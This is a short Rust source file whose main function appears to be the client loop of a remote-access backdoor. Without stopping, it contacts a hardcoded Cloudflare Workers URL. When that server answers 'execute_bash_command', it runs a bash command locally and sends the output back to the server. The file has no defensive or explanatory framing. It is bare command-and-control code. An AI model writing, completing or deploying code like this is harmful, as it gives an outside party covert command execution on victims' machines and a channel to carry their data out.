#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";

    loop {
        // Send data to the Worker
        let response = match worker_communication::send_data_request(&worker_url, "Sample data").await {
            Ok(response) => response,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };

        // Check the response from the Worker
        if response == "execute_bash_command" {
            match command_executor::execute_bash_command(true) {
                Ok(output) => {
                    // Send the command output to the Worker
                    match worker_communication::send_data_request(&worker_url, &output).await {
                        Ok(_) => println!("Command output sent to the Worker."),
                        Err(e) => println!("Error sending command output to the Worker: {}", e),
                    }
                }
                Err(e) => println!("Error executing command: {}", e),
            }
        } else {
            command_executor::execute_bash_command(false);
        }

        // Add more conditions or logic to handle different commands
    }
}